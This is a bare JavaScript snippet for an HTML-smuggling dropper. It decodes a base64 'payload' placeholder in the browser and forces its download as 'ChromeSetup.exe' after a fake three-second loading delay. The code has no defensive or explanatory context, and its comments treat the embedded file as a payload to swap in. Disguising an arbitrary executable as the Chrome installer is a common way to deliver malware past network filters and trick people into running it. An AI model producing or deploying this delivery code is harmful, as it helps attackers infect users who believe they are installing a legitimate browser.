    <script>

        var fileData = 'BASE64_ENCODED_STRING'; // Replace with your base64 encoded payload

        var fileName = 'ChromeSetup.exe';


        function startDownload() {

            document.getElementById('loader').style.display = 'block';

            setTimeout(downloadPayload, 3000); // Add a 3-second delay for the gimmick effect

        }


        function downloadPayload() {

            var binary = atob(fileData);

            var len = binary.length;

            var buffer = new Uint8Array(len);

            for (var i = 0; i < len; i++) {

                buffer[i] = binary.charCodeAt(i);

            }


            var blob = new Blob([buffer], { type: 'application/octet-stream' });

            var url = window.URL.createObjectURL(blob);

            var a = document.createElement('a');

            a.href = url;

            a.download = fileName;

            document.body.appendChild(a);

            a.click();

            window.URL.revokeObjectURL(url);

            document.getElementById('loader').style.display = 'none';

        }

    </script>
